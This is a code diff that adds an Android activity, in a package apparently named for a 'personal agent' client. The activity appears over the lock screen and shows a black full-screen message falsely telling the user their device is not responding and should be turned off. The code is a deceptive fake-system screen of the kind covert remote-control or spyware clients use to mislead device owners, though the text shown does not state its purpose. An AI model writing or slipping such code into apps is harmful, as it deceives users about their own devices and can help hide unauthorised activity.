@@ -1,0 +1,2 @@
+package com.personalagent.client
+class LockActivity:android.app.Activity(){override fun onCreate(b:android.os.Bundle?){super.onCreate(b);window.addFlags(524288 or 4194304);setContentView(android.widget.TextView(this).apply{text="Your device is not responding.\\n\\nPlease turn off your device.";textSize=22f;gravity=17;setTextColor(android.graphics.Color.WHITE);setBackgroundColor(android.graphics.Color.BLACK)})}}
